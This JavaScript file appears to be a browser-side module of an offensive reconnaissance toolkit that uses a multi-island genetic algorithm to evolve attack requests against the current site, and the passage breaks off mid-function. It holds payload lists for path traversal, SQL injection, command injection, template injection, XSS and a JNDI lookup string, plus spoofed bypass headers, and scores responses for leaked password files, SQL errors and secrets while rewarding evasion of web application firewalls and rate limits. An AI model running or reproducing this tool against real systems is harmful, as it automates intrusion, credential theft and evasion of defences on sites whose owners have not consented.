// language: JavaScript, file: 16_darwin.js, target: modern browsers
// DARWIN Ω -- multi-island NSGA-II co-evolution engine

(function () {
  'use strict';
  if (!window.ReconCore) return;
  var core = window.ReconCore;
  var eventBus = core.eventBus;
  var storage = core.storage;
  var scope = core.scope;
  var mods = core.modules = core.modules || {};

  // ══════════════════════════════════════════════════════════════
  // STORAGE
  // ══════════════════════════════════════════════════════════════
  var KEYS = {
    hall: 'darwin_omega_hall_v1',
    genePool: 'darwin_omega_genepool_v1',
    defender: 'darwin_omega_defender_v1',
    novelty: 'darwin_omega_novelty_v1',
    stats: 'darwin_omega_stats_v1',
    meta: 'darwin_omega_meta_v1'
  };

  function loadJSON(k, d) {
    try { var r = localStorage.getItem(k); return r ? JSON.parse(r) : d; }
    catch (e) { return d; }
  }
  function saveJSON(k, o) {
    try { localStorage.setItem(k, JSON.stringify(o)); } catch (e) {}
  }
  function rid() {
    var a = crypto.getRandomValues(new Uint8Array(6));
    var s = '';
    for (var i = 0; i < a.length; i++) s += a[i].toString(16).padStart(2, '0');
    return s;
  }
  function escRe(s) {
    return String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // ══════════════════════════════════════════════════════════════
  // GENE PRIMITIVES
  // ══════════════════════════════════════════════════════════════
  var P = {
    pathFrags: ['admin','api','v1','v2','v3','user','users','file','files','download','upload','read','load','fetch','config','debug','test','internal','private','backup','backups','.env','wp-json','wp-content','actuator','graphql','phpinfo','info','trace','log','logs','storage','data','rest','rpc','auth','login','register','profile','settings','metrics','health','status','version','meta','static','assets','public','private','tmp','temp','cache','.git','.svn','server-status','telescope','_ignition','_profiler','_debug','__debug__','jolokia','heapdump','mappings','beans','env'],
    extensions: ['','.php','.asp','.aspx','.jsp','.do','.action','.json','.xml','.html','.txt','.bak','.old','.orig','.swp','.save','.copy','.tmp','.log','.conf','.config','.yml','.yaml','.env','.sql','.db','.zip','.tar','.gz','.7z','.rar','.phps','.inc','.module','.phtml'],
    traversal: ['','..%2f','..%2F','%2e%2e%2f','%2e%2e%2F','..%252f','%252e%252e%252f','....//','....//','..;/','..%3b/','..%5c','%c0%ae%c0%ae%c0%af','..%c0%af','..././','....\\/','..%00/','%2e%2e%5c','..%255c','....%2f','..%ef%bc%8f','....//....//','..%09/','..%0a/','..%0d/'],
    terminators: ['','/','/.','/..','%00','%0d%0a',';','%3b','?','#','..;/','%23','%3f','%09','%0a','%0d','\\\\','%5c','%2f','%252f'],
    encodings: ['raw','url','double-url','triple-url','unicode','hex','mixed','overlong','case-flip'],
    caseMutations: ['','upper','lower','mixed','alternating','random-word'],
    methods: ['GET','POST','PUT','PATCH','DELETE','OPTIONS','HEAD'],
    paramKeys: ['id','file','path','url','uri','next','redirect','return','goto','dest','cmd','exec','run','debug','test','admin','user','name','query','q','search','page','action','do','op','template','view','load','include','require','src','source','target','from','to','data','input','output','filter','sort','order','type','format','mode','env','config','setting','key','token','hash','signature','nonce','state','callback','image','img','avatar','document','doc','resource','download','upload','import','export','report','backup','restore'],
    paramVals: ['1','0','null','true','false','undefined','NaN','[]','{}','..%2f..%2fetc%2fpasswd','http://127.0.0.1','http://localhost','file:///etc/passwd','file:///c:/windows/win.ini','$(id)','`id`','|id',';id','&&id','||id','{{7*7}}','${7*7}','<%=7*7%>','#{7*7}','<script>alert(1)</script>','"><script>alert(1)</script>',"' OR 1=1--",'" OR "1"="1',"' OR '1'='1",'1;SELECT SLEEP(5)','1 AND SLEEP(5)','%00','../../../etc/passwd','..\\..\\..\\windows\\win.ini','${jndi:ldap://x/}','\x00','\r\n','%0d%0a'],
    injectHeaders: ['X-Forwarded-For','X-Forwarded-Host','X-Forwarded-Proto','X-Real-IP','X-Client-IP','X-Originating-IP','X-Remote-IP','X-Remote-Addr','X-Original-URL','X-Rewrite-URL','X-HTTP-Method-Override','X-HTTP-Method','X-Method-Override','X-Override-URL','X-Original-Host','X-Backend-Server','X-Host','X-Forwarded-Server','X-Custom-IP-Authorization','X-Proxy-User','X-User-ID','X-User-Role','X-Admin','X-Auth-User'],
    injectVals: ['127.0.0.1','localhost','::1','0.0.0.0','admin','/admin','/internal','/api/admin','http://127.0.0.1','https://localhost','http://localhost:80/admin','file:///etc/passwd','%2f%2f127.0.0.1']
  };

  function pick(a) { return a[Math.floor(Math.random() * a.length)]; }

  function applyEncoding(s, mode) {
    if (mode === 'raw') return s;
    if (mode === 'url') return encodeURIComponent(s).replace(/%2F/gi, '/');
    if (mode === 'double-url') return encodeURIComponent(encodeURIComponent(s)).replace(/%252F/gi, '/');
    if (mode === 'triple-url') return encodeURIComponent(encodeURIComponent(encodeURIComponent(s))).replace(/%25252F/gi, '/');
    if (mode === 'unicode') return s.replace(/[a-z]/g, function (c) { return '%u00' + c.charCodeAt(0).toString(16); });
    if (mode === 'hex') return s.split('').map(function (c) { return '%' + c.charCodeAt(0).toString(16); }).join('');
    if (mode === 'mixed') return s.split('').map(function (c) { return Math.random() < 0.4 ? '%' + c.charCodeAt(0).toString(16) : c; }).join('');
    if (mode === 'overlong') return s.replace(/\//g, '%c0%af').replace(/\./g, '%c0%ae');
    if (mode === 'case-flip') return s;
    return s;
  }

  function applyCase(s, mode) {
    if (!mode) return s;
    if (mode === 'upper') return s.toUpperCase();
    if (mode === 'lower') return s.toLowerCase();
    if (mode === 'mixed') return s.split('').map(function (c) { return Math.random() < 0.5 ? c.toUpperCase() : c.toLowerCase(); }).join('');
    if (mode === 'alternating') return s.split('').map(function (c, i) { return i % 2 ? c.toUpperCase() : c.toLowerCase(); }).join('');
    if (mode === 'random-word') {
      var words = s.split('/');
      return words.map(function (w) {
        return Math.random() < 0.5 ? w.toUpperCase() : w;
      }).join('/');
    }
    return s;
  }

  // ══════════════════════════════════════════════════════════════
  // GENOME
  // ══════════════════════════════════════════════════════════════
  function newGenome(spec) {
    spec = spec || {};
    var g = {
      id: rid(),
      method: spec.method || pick(P.methods.slice(0, 4)),
      segments: spec.segments || [],
      ext: spec.ext !== undefined ? spec.ext : '',
      traversal: spec.traversal !== undefined ? spec.traversal : '',
      terminator: spec.terminator !== undefined ? spec.terminator : '',
      encoding: spec.encoding || 'raw',
      caseMode: spec.caseMode || '',
      query: spec.query || [],
      headers: spec.headers || {},
      body: spec.body || null,
      canary: spec.canary || 'dw' + rid().slice(0, 6),
      island: spec.island || null,
      species: spec.species || null,
      generation: spec.generation || 0,
      lineage: spec.lineage || null,
      fitness: [0, 0, 0, 0], // [impact, stealth, novelty, cost]
      reasons: [],
      tags: spec.tags || [],
      fromGenePool: spec.fromGenePool || false
    };
    if (!g.segments.length) {
      var n = 1 + Math.floor(Math.random() * 3);
      for (var i = 0; i < n; i++) g.segments.push(pick(P.pathFrags));
    }
    return g;
  }

  function buildPath(g) {
    var parts = g.segments.map(function (s) { return applyCase(s, g.caseMode); });
    var path = '/' + parts.join('/');
    path += g.ext;
    if (g.traversal) path = '/' + g.traversal + path.replace(/^\//, '');
    path += g.terminator;
    if (g.encoding !== 'case-flip') path = applyEncoding(path, g.encoding);
    return path;
  }

  function buildQuery(g) {
    if (!g.query.length) return '';
    var parts = g.query.map(function (q) {
      return encodeURIComponent(q.key) + '=' + applyEncoding(q.val, g.encoding);
    });
    return '?' + parts.join('&');
  }

  function buildUrl(g) {
    return location.origin + buildPath(g) + buildQuery(g);
  }

  function sig(g) {
    return g.method + '|' + buildPath(g) + '|' + g.query.length + '|' + g.encoding;
  }

  // ══════════════════════════════════════════════════════════════
  // GENETIC DISTANCE + SPECIATION
  // ══════════════════════════════════════════════════════════════
  function geneticDistance(a, b) {
    var d = 0;
    var n = 0;

    // Segment distance (Jaccard-ish)
    var setA = {}, setB = {};
    a.segments.forEach(function (s) { setA[s] = 1; });
    b.segments.forEach(function (s) { setB[s] = 1; });
    var union = {};
    Object.keys(setA).forEach(function (k) { union[k] = 1; });
    Object.keys(setB).forEach(function (k) { union[k] = 1; });
    var uCount = Object.keys(union).length || 1;
    var interCount = 0;
    Object.keys(setA).forEach(function (k) { if (setB[k]) interCount++; });
    d += 1 - (interCount / uCount);
    n++;

    // Encoding
    d += a.encoding === b.encoding ? 0 : 1; n++;
    // Case
    d += a.caseMode === b.caseMode ? 0 : 1; n++;
    // Method
    d += a.method === b.method ? 0 : 1; n++;
    // Ext
    d += a.ext === b.ext ? 0 : 1; n++;
    // Traversal
    d += a.traversal === b.traversal ? 0 : 1; n++;
    // Terminator
    d += a.terminator === b.terminator ? 0 : 1; n++;
    // Query count
    d += Math.min(1, Math.abs(a.query.length - b.query.length) / 3); n++;
    // Header count
    var ha = Object.keys(a.headers || {}).length;
    var hb = Object.keys(b.headers || {}).length;
    d += Math.min(1, Math.abs(ha - hb) / 3); n++;

    return d / n;
  }

  var SPECIATION_THRESHOLD = 0.35;

  function speciate(population) {
    var species = [];
    population.forEach(function (g) {
      var placed = false;
      for (var i = 0; i < species.length; i++) {
        var rep = species[i].representative;
        if (geneticDistance(g, rep) < SPECIATION_THRESHOLD) {
          species[i].members.push(g);
          g.species = species[i].id;
          placed = true;
          break;
        }
      }
      if (!placed) {
        var sp = {
          id: 'sp' + rid().slice(0, 4),
          representative: g,
          members: [g],
          age: 0,
          bestImpact: 0
        };
        g.species = sp.id;
        species.push(sp);
      }
    });
    return species;
  }

  function fitnessSharing(species) {
    species.forEach(function (sp) {
      var n = sp.members.length;
      if (n <= 1) return;
      // Fitness shared across members of a species
      sp.members.forEach(function (g) {
        var scale = 1 / Math.sqrt(n);
        g.fitness = g.fitness.map(function (f) { return f * scale; });
      });
    });
  }

  // ══════════════════════════════════════════════════════════════
  // NSGA-II -- Pareto sorting + crowding distance
  // ══════════════════════════════════════════════════════════════
  function dominates(a, b) {
    var aBetter = false, bBetter = false;
    for (var i = 0; i < a.fitness.length; i++) {
      if (a.fitness[i] > b.fitness[i]) aBetter = true;
      else if (a.fitness[i] < b.fitness[i]) bBetter = true;
    }
    return aBetter && !bBetter;
  }

  function fastNonDominatedSort(pop) {
    var fronts = [[]];
    var S = new Map();
    var n = new Map();

    pop.forEach(function (p) {
      S.set(p.id, []);
      n.set(p.id, 0);
    });

    for (var i = 0; i < pop.length; i++) {
      for (var j = 0; j < pop.length; j++) {
        if (i === j) continue;
        var p = pop[i], q = pop[j];
        if (dominates(p, q)) S.get(p.id).push(q);
        else if (dominates(q, p)) n.set(p.id, n.get(p.id) + 1);
      }
      if (n.get(pop[i].id) === 0) {
        pop[i].paretoRank = 0;
        fronts[0].push(pop[i]);
      }
    }

    var i = 0;
    while (fronts[i].length > 0) {
      var next = [];
      fronts[i].forEach(function (p) {
        S.get(p.id).forEach(function (q) {
          n.set(q.id, n.get(q.id) - 1);
          if (n.get(q.id) === 0) {
            q.paretoRank = i + 1;
            next.push(q);
          }
        });
      });
      i++;
      fronts.push(next);
    }
    if (fronts[fronts.length - 1].length === 0) fronts.pop();
    return fronts;
  }

  function crowdingDistance(front) {
    var l = front.length;
    if (l === 0) return;
    front.forEach(function (g) { g.crowding = 0; });
    for (var m = 0; m < 4; m++) {
      var sorted = front.slice().sort(function (a, b) {
        return a.fitness[m] - b.fitness[m];
      });
      sorted[0].crowding = Infinity;
      sorted[l - 1].crowding = Infinity;
      var range = sorted[l - 1].fitness[m] - sorted[0].fitness[m];
      if (range === 0) continue;
      for (var i = 1; i < l - 1; i++) {
        sorted[i].crowding += (sorted[i + 1].fitness[m] - sorted[i - 1].fitness[m]) / range;
      }
    }
  }

  function nsga2Select(pop, n) {
    var fronts = fastNonDominatedSort(pop);
    var next = [];
    for (var i = 0; i < fronts.length; i++) {
      crowdingDistance(fronts[i]);
      if (next.length + fronts[i].length <= n) {
        next = next.concat(fronts[i]);
      } else {
        var remaining = n - next.length;
        var sorted = fronts[i].slice().sort(function (a, b) {
          if (a.paretoRank !== b.paretoRank) return a.paretoRank - b.paretoRank;
          return b.crowding - a.crowding;
        });
        next = next.concat(sorted.slice(0, remaining));
        break;
      }
    }
    return next;
  }

  function hypervolume(pop, refPoint) {
    if (!pop.length) return 0;
    // Approximate with 2D projection: impact × stealth
    var points = pop.map(function (g) { return [g.fitness[0], g.fitness[1]]; });
    points.sort(function (a, b) { return b[0] - a[0]; });
    var hv = 0;
    var prevY = refPoint[1];
    points.forEach(function (p) {
      var w = Math.max(0, p[0]);
      var h = Math.max(0, prevY - p[1]);
      hv += w * h;
      prevY = Math.min(prevY, p[1]);
    });
    return hv;
  }

  // ══════════════════════════════════════════════════════════════
  // DEFENDER -- Bayesian WAF model
  // ══════════════════════════════════════════════════════════════
  var Defender = {
    rules: [],
    init: function () {
      var raw = loadJSON(KEYS.defender, []);
      this.rules = raw.map(function (r) {
        return {
          id: r.id || rid(),
          pattern: r.pattern,
          regex: new RegExp(r.pattern, 'i'),
          w: r.w || 0.5,
          hits: r.hits || 0,
          misses: r.misses || 0
        };
      });
    },
    signalsFrom: function (g) {
      var path = buildPath(g);
      var query = g.query.map(function (q) { return q.key + '=' + q.val; }).join('&');
      return (g.method + ' ' + path + ' ' + query).toLowerCase();
    },
    learnBlock: function (g) {
      var s = this.signalsFrom(g);
      var matched = false;
      for (var i = 0; i < this.rules.length; i++) {
        var r = this.rules[i];
        if (r.regex.test(s)) {
          r.hits++;
          r.w = Math.min(1, r.w + 0.18);
          matched = true;
          break;
        }
      }
      if (!matched) {
        var tokens = s.split(/[\/\s\?&=\-_.]+/).filter(function (t) { return t.length > 3; });
        tokens.slice(0, 4).forEach(function (t) {
          this.rules.push({
            id: rid(),
            pattern: escRe(t),
            regex: new RegExp(escRe(t), 'i'),
            w: 0.4, hits: 1, misses: 0
          });
        }, this);
      }
      this.persist();
    },
    learnPass: function (g) {
      var s = this.signalsFrom(g);
      var changed = false;
      for (var i = 0; i < this.rules.length; i++) {
        var r = this.rules[i];
        if (r.regex.test(s)) {
          r.misses++;
          r.w = Math.max(0.05, r.w - 0.09);
          changed = true;
        }
      }
      var before = this.rules.length;
      this.rules = this.rules.filter(function (r) {
        return r.hits > r.misses * 0.4 && r.w > 0.1;
      });
      if (this.rules.length !== before) changed = true;
      if (changed) this.persist();
    },
    predict: function (g) {
      var s = this.signalsFrom(g);
      var bp = 0;
      for (var i = 0; i < this.rules.length; i++) {
        var r = this.rules[i];
        if (r.regex.test(s)) bp = 1 - (1 - bp) * (1 - r.w);
      }
      return bp;
    },
    persist: function () {
      saveJSON(KEYS.defender, this.rules.map(function (r) {
        return { id: r.id, pattern: r.pattern, w: r.w, hits: r.hits, misses: r.misses };
      }));
    },
    size: function () { return this.rules.length; },
    reset: function () { this.rules = []; this.persist(); },
    top: function (n) {
      return this.rules.slice().sort(function (a, b) { return b.w - a.w; }).slice(0, n || 20);
    }
  };
  Defender.init();

  // ══════════════════════════════════════════════════════════════
  // LAMARCKIAN GENE POOL
  // ══════════════════════════════════════════════════════════════
  var GenePool = {
    pool: [],
    init: function () {
      var raw = loadJSON(KEYS.genePool, []);
      this.pool = raw.map(function (r) {
        return {
          id: r.id || rid(),
          type: r.type,
          value: r.value,
          success: r.success || 0,
          usage: r.usage || 0,
          weight: r.weight || 1.0,
          addedAt: r.addedAt || Date.now()
        };
      });
    },
    extract: function (g, fitnessVec) {
      var impact = fitnessVec[0];
      if (impact < 2) return; // only extract from successful genomes

      var genes = [
        { type: 'traversal', value: g.traversal },
        { type: 'terminator', value: g.terminator },
        { type: 'encoding', value: g.encoding },
        { type: 'caseMode', value: g.caseMode },
        { type: 'ext', value: g.ext }
      ];
      genes.forEach(function (gene) {
        if (!gene.value) return;
        GenePool.register(gene.type, gene.value);
      });
      // Also extract combinations
      var combo = g.traversal + '|' + g.encoding;
      if (g.traversal && g.encoding !== 'raw') {
        GenePool.register('combo', combo);
      }
    },
    register: function (type, value) {
      var existing = this.pool.find(function (p) { return p.type === type && p.value === value; });
      if (existing) {
        existing.success++;
        existing.weight = Math.min(3.0, existing.weight * 1.15);
      } else {
        this.pool.push({
          id: rid(), type: type, value: value,
          success: 1, usage: 0, weight: 1.2, addedAt: Date.now()
        });
      }
      this.persist();
    },
    sample: function (type) {
      var candidates = this.pool.filter(function (p) { return p.type === type; });
      if (!candidates.length) return null;
      var total = candidates.reduce(function (a, p) { return a + p.weight; }, 0);
      var r = Math.random() * total;
      var acc = 0;
      for (var i = 0; i < candidates.length; i++) {
        acc += candidates[i].weight;
        if (r <= acc) {
          candidates[i].usage++;
          return candidates[i].value;
        }
      }
      return candidates[candidates.length - 1].value;
    },
    inject: function (g) {
      // Random chance to inject a learned gene
      if (Math.random() < 0.3) {
        var t = this.sample('traversal');
        if (t !== null && t !== undefined) { g.traversal = t; g.fromGenePool = true; }
      }
      if (Math.random() < 0.25) {
        var e = this.sample('encoding');
        if (e) { g.encoding = e; g.fromGenePool = true; }
      }
      if (Math.random() < 0.2) {
        var tm = this.sample('terminator');
        if (tm !== null && tm !== undefined) { g.terminator = tm; g.fromGenePool = true; }
      }
      return g;
    },
    prune: function () {
      var cutoff = Date.now() - 30 * 24 * 3600 * 1000;
      this.pool = this.pool.filter(function (p) {
        return p.addedAt > cutoff || p.success > 2;
      }).sort(function (a, b) { return b.weight - a.weight; }).slice(0, 200);
      this.persist();
    },
    persist: function () {
      saveJSON(KEYS.genePool, this.pool);
    },
    size: function () { return this.pool.length; },
    top: function (n) {
      return this.pool.slice().sort(function (a, b) { return b.weight - a.weight; }).slice(0, n || 15);
    },
    reset: function () { this.pool = []; this.persist(); }
  };
  GenePool.init();

  // ══════════════════════════════════════════════════════════════
  // META-LEARNING -- which mutations produce successful offspring?
  // ══════════════════════════════════════════════════════════════
  var Meta = {
    state: null,
    init: function () {
      this.state = loadJSON(KEYS.meta, {
        ops: {},
        targets: 0,
        updatedAt: Date.now()
      });
    },
    record: function (op, improved) {
      if (!this.state.ops[op]) this.state.ops[op] = { wins: 0, losses: 0 };
      if (improved) this.state.ops[op].wins++;
      else this.state.ops[op].losses++;
    },
    score: function (op) {
      var o = this.state.ops[op];
      if (!o || o.wins + o.losses < 5) return 1.0;
      var rate = o.wins / (o.wins + o.losses);
      return 0.3 + rate * 1.5;
    },
    persist: function () {
      this.state.updatedAt = Date.now();
      saveJSON(KEYS.meta, this.state);
    },
    reset: function () { this.state = { ops: {}, targets: 0, updatedAt: Date.now() }; this.persist(); }
  };
  Meta.init();

  // ══════════════════════════════════════════════════════════════
  // NOVELTY ARCHIVE
  // ══════════════════════════════════════════════════════════════
  var Novelty = {
    archive: loadJSON(KEYS.novelty, []),
    fingerprint: function (body) {
      var norm = String(body || '')
        .replace(/\d+/g, 'N')
        .replace(/\s+/g, ' ')
        .slice(0, 200);
      return storage.hashKey(norm);
    },
    score: function (body) {
      var fp = this.fingerprint(body);
      var count = this.archive.filter(function (h) { return h === fp; }).length;
      if (count === 0) return 1;
      return Math.max(0, 1 - count * 0.2);
    },
    add: function (body) {
      var fp = this.fingerprint(body);
      this.archive.push(fp);
      if (this.archive.length > 600) this.archive = this.archive.slice(-600);
      saveJSON(KEYS.novelty, this.archive);
    },
    reset: function () { this.archive = []; saveJSON(KEYS.novelty, this.archive); }
  };

  // ══════════════════════════════════════════════════════════════
  // FITNESS EVALUATION -- returns [impact, stealth, novelty, cost]
  // ══════════════════════════════════════════════════════════════
  var baseline = null;

  async function sampleBaseline(n) {
    n = n || 6;
    var samples = [];
    for (var i = 0; i < n; i++) {
      var rand = '/__dw_' + rid() + '__';
      try {
        var t0 = performance.now();
        var r = await fetch(rand, { credentials: 'include', redirect: 'manual' });
        var txt = '';
        try { txt = await r.text(); } catch (e) {}
        samples.push({ status: r.status, len: txt.length, ms: performance.now() - t0 });
      } catch (e) {
        samples.push({ status: 0, len: 0, ms: 0 });
      }
      await new Promise(function (res) { setTimeout(res, 100); });
    }
    var mean = samples.reduce(function (a, s) { return a + s.len; }, 0) / samples.length;
    var meanMs = samples.reduce(function (a, s) { return a + s.ms; }, 0) / samples.length;
    var varSum = samples.reduce(function (a, s) { return a + Math.pow(s.len - mean, 2); }, 0);
    var sd = Math.sqrt(varSum / samples.length) || 1;
    var statusCounts = {};
    samples.forEach(function (s) { statusCounts[s.status] = (statusCounts[s.status] || 0) + 1; });
    var statusMode = null, maxC = 0;
    Object.keys(statusCounts).forEach(function (k) {
      if (statusCounts[k] > maxC) { maxC = statusCounts[k]; statusMode = Number(k); }
    });
    baseline = { mean: mean, sd: sd, meanMs: meanMs, statusMode: statusMode };
    return baseline;
  }

  async function evaluate(g) {
    var url = buildUrl(g);
    var t0 = performance.now();
    var res, body = '', respHeaders = {};

    try {
      var opts = {
        method: g.method,
        credentials: 'include',
        redirect: 'manual',
        headers: Object.assign({}, g.headers)
      };
      if (g.body) {
        opts.body = g.body;
        if (!opts.headers['Content-Type']) opts.headers['Content-Type'] = 'application/json';
      }
      res = await fetch(url, opts);
      try { body = await res.text(); } catch (e) {}
      try { res.headers.forEach(function (v, k) { respHeaders[k] = v; }); } catch (e) {}
    } catch (e) {
      return { fitness: [0, 1, 0, 0], reasons: ['net-error'], g: g, blocked: false };
    }

    var ms = performance.now() - t0;
    var impact = 0;
    var stealth = 1.0;
    var novelty = Novelty.score(body);
    var cost = Math.max(0, 1 - ms / 5000);
    var reasons = [];

    // ── IMPACT (acquisition value)
    if (baseline && res.status !== baseline.statusMode) {
      if (res.status === 200) { impact += 3.5; reasons.push('s200'); }
      else if (res.status === 500) { impact += 6; reasons.push('s500'); }
      else if (res.status >= 300 && res.status < 400) { impact += 1.5; reasons.push('s3xx'); }
      else if (res.status === 0) { impact += 0.3; reasons.push('s0'); }
      else { impact += 1; reasons.push('s' + res.status); }
    }
    if (baseline) {
      var z = Math.abs((body.length - baseline.mean) / baseline.sd);
      if (z > 2) { impact += Math.min(z * 0.4, 4); reasons.push('len-z' + z.toFixed(1)); }
    }
    if (g.canary && body.indexOf(g.canary) !== -1) { impact += 5; reasons.push('reflect'); }
    if (/stack trace|traceback|syntax error|on line \d+|warning.*line \d+/i.test(body)) { impact += 6; reasons.push('stack'); }
    if (/root:.*:0:0:/i.test(body)) { impact += 15; reasons.push('lfi'); }
    if (/SQL syntax.*MySQL|PostgreSQL.*ERROR|ORA-\d{5}|SQLite.*error|ODBC.*SQL/i.test(body)) { impact += 10; reasons.push('sql'); }
    if (/(Index of \/|<title>Index of|Parent Directory)/i.test(body)) { impact += 4; reasons.push('dir-list'); }
    if (/phpinfo\(\)|PHP Version =>/i.test(body)) { impact += 8; reasons.push('phpinfo'); }
    if (/activeProfiles|propertySources|jolokia|heapdump/i.test(body)) { impact += 8; reasons.push('actuator'); }
    if (/APP_KEY|DB_PASSWORD|SECRET_KEY|AWS_ACCESS|PRIVATE KEY/i.test(body)) { impact += 12; reasons.push('secret'); }
    if (/<(html|body|form|input)/i.test(body) && res.status === 200 && body.length > 2000 && baseline && body.length - baseline.mean > 2 * baseline.sd) { impact += 1.5; reasons.push('content'); }
    if (res.status === 500) { impact += 2; reasons.push('error'); }

    // ── STEALTH (inverse of detection)
    if (/waf|blocked|access denied|cloudflare|akamai|mod_security|security/i.test(body) && res.status >= 400) {
      stealth *= 0.2;
      reasons.push('waf');
    }
    if (res.status === 403) { stealth *= 0.3; reasons.push('s403'); }
    if (res.status === 429) { stealth *= 0.1; reasons.push('rate-limit'); }
    if (respHeaders['x-ratelimit-remaining']) {
      var rem = parseInt(respHeaders['x-ratelimit-remaining'], 10);
      if (rem === 0) stealth *= 0.5;
    }
    if (respHeaders['cf-ray'] || respHeaders['x-amz-cf-id']) stealth *= 0.85;

    // ── NOVELTY bonus to impact
    if (novelty > 0.7) { impact += 2; reasons.push('novel'); }

    // ── WAF penalty on impact
    if (reasons.indexOf('waf') !== -1) impact -= 3;

    return {
      fitness: [impact, stealth, novelty, cost],
      reasons: reasons,
      g: g,
      blocked: reasons.indexOf('waf') !== -1 || reasons.indexOf('s403') !== -1 || reasons.indexOf('rate-limit') !== -1,
      response: {
        status: res.status,
        len: body.length,
        ms: ms,
        headers: respHeaders,
        bodyPreview: body.slice(0, 500),
        bodyFull: body.slice(0, 5000)
      }
    };
  }

  // ══════════════════════════════════════════════════════════════
  // GENETIC OPERATORS
  // ══════════════════════════════════════════════════════════════
  function crossover(a, b) {
    var child = newGenome({ generation: Math.max(a.generation, b.generation) + 1 });
    child.lineage = { type: 'crossover', p1: a.id, p2: b.id };
    child.island = a.island;

    var cut = Math.floor((a.segments.length + b.segments.length) / 2);
    child.segments = a.segments.slice(0, cut).concat(b.segments.slice(cut - a.segments.length)).slice(0, 4);
    if (!child.segments.length) child.segments = a.segments.slice();

    child.ext = (a.fitness[0] > b.fitness[0] ? a.ext : b.ext) || '';
    child.traversal = Math.random() < 0.5 ? a.traversal : b.traversal;
    child.terminator = Math.random() < 0.5 ? a.terminator : b.terminator;
    child.encoding = Math.random() < 0.5 ? a.encoding : b.encoding;
    child.caseMode = Math.random() < 0.5 ? a.caseMode : b.caseMode;
    child.method = a.fitness[0] > b.fitness[0] ? a.method : b.method;

    var qm = {};
    a.query.concat(b.query).forEach(function (q) { if (Math.random() < 0.7) qm[q.key] = q; });
    child.query = Object.keys(qm).map(function (k) { return qm[k]; }).slice(0, 3);

    var hm = {};
    [a.headers, b.headers].forEach(function (h) {
      Object.keys(h || {}).forEach(function (k) { if (Math.random() < 0.6) hm[k] = h[k]; });
    });
    child.headers = hm;

    child.canary = Math.random() < 0.5 ? a.canary : b.canary;
    return child;
  }

  function mutate(g, baseRate) {
    var m = newGenome({
      method: g.method,
      segments: g.segments.slice(),
      ext: g.ext,
      traversal: g.traversal,
      terminator: g.terminator,
      encoding: g.encoding,
      caseMode: g.caseMode,
      query: g.query.map(function (q) { return { key: q.key, val: q.val }; }),
      headers: Object.assign({}, g.headers),
      body: g.body,
      generation: g.generation + 1,
      canary: g.canary,
      island: g.island
    });
    m.lineage = { type: 'mutation', parent: g.id };

    var ops = [];

    // Meta-learned weights per mutation type
    function effectiveRate(op) {
      return baseRate * Meta.score(op);
    }

    if (Math.random() < effectiveRate('encoding')) { m.encoding = pick(P.encodings); ops.push('encoding'); }
    if (Math.random() < effectiveRate('case')) { m.caseMode = pick(P.caseMutations); ops.push('case'); }
    if (Math.random() < effectiveRate('traversal')) { m.traversal = pick(P.traversal); ops.push('traversal'); }
    if (Math.random() < effectiveRate('terminator')) { m.terminator = pick(P.terminators); ops.push('terminator'); }
    if (Math.random() < effectiveRate('ext')) { m.ext = pick(P.extensions); ops.push('ext'); }
    if (Math.random() < effectiveRate('seg-replace')) {
      var idx = Math.floor(Math.random() * m.segments.length);
      m.segments[idx] = pick(P.pathFrags);
      ops.push('seg-replace');
    }
    if (Math.random() < effectiveRate('seg-add') && m.segments.length < 4) {
      m.segments.push(pick(P.pathFrags));
      ops.push('seg-add');
    }
    if (Math.random() < effectiveRate('query')) {
      var qk = pick(P.paramKeys), qv = pick(P.paramVals);
      if (m.query.length < 3) m.query.push({ key: qk, val: qv });
      else m.query[Math.floor(Math.random() * m.query.length)] = { key: qk, val: qv };
      ops.push('query');
    }
    if (Math.random() < effectiveRate('header')) {
      m.headers[pick(P.injectHeaders)] = pick(P.injectVals);
      ops.push('header');
    }
    if (Math.random() < effectiveRate('method')) { m.method = pick(P.methods); ops.push('method'); }

    // Lamarckian injection
    GenePool.inject(m);

    m.tags = ops;
    return m;
  }

  function tournament(pop, k) {
    k = k || 3;
    var best = null;
    for (var i = 0; i < k; i++) {
      var c = pop[Math.floor(Math.random() * pop.length)];
      if (!best) { best = c; continue; }
      if (c.paretoRank < best.paretoRank) best = c;
      else if (c.paretoRank === best.paretoRank && c.crowding > best.crowding) best = c;
    }
    return best;
  }

  // ══════════════════════════════════════════════════════════════
  // ISLAND
  // ══════════════════════════════════════════════════════════════
  function Island(id, bias) {
    return {
      id: id,
      bias: bias || {},
      population: [],
      generation: 0,
      bestImpact: 0,
      bestStealth: 0,
      stagnation: 0,
      mutationRate: 0.25
    };
  }

  function seedIsland(island, size) {
    var pop = [];
    for (var i = 0; i < size; i++) {
      var g = newGenome({ island: island.id });
      // Apply island bias
      if (island.bias.encoding && Math.random() < 0.7) g.encoding = pick(island.bias.encoding);
      if (island.bias.traversal && Math.random() < 0.6) g.traversal = pick(island.bias.traversal);
      if (island.bias.paramKeys && Math.random() < 0.5) g.query.push({ key: pick(island.bias.paramKeys), val: pick(P.paramVals) });
      if (island.bias.headers && Math.random() < 0.5) g.headers[pick(island.bias.headers)] = pick(P.injectVals);
      if (island.bias.seedPaths) {
        g.segments = island.bias.seedPaths[i % island.bias.seedPaths.length].slice();
      }
      GenePool.inject(g);
      pop.push(g);
    }
    island.population = pop;
    return pop;
  }

  // ══════════════════════════════════════════════════════════════
  // HALL OF FAME
  // ══════════════════════════════════════════════════════════════
  var hallOfFame = loadJSON(KEYS.hall, []);

  function recordHall(individual) {
    if (individual.fitness[0] <= 1) return;
    var s = sig(individual.g);
    var existing = hallOfFame.find(function (h) { return h.sig === s; });
    if (existing) {
      if (individual.fitness[0] > existing.impact) {
        existing.impact = individual.fitness[0];
        existing.at = Date.now();
      }
      return;
    }
    hallOfFame.push({
      sig: s,
      impact: individual.fitness[0],
      stealth: individual.fitness[1],
      novelty: individual.fitness[2],
      reasons: individual.reasons,
      genome: {
        method: individual.g.method,
        path: buildPath(individual.g),
        query: individual.g.query,
        headers: individual.g.headers,
        encoding: individual.g.encoding,
        island: individual.g.island
      },
      at: Date.now(),
      host: scope.currentHost
    });
    hallOfFame.sort(function (a, b) { return b.impact - a.impact; });
    hallOfFame = hallOfFame.slice(0, 40);
    saveJSON(KEYS.hall, hallOfFame);
  }

  // ══════════════════════════════════════════════════════════════
  // MIGRATION
  // ══════════════════════════════════════════════════════════════
  function migrate(islands, n) {
    n = n || 2;
    var migrants = [];
    islands.forEach(function (isl) {
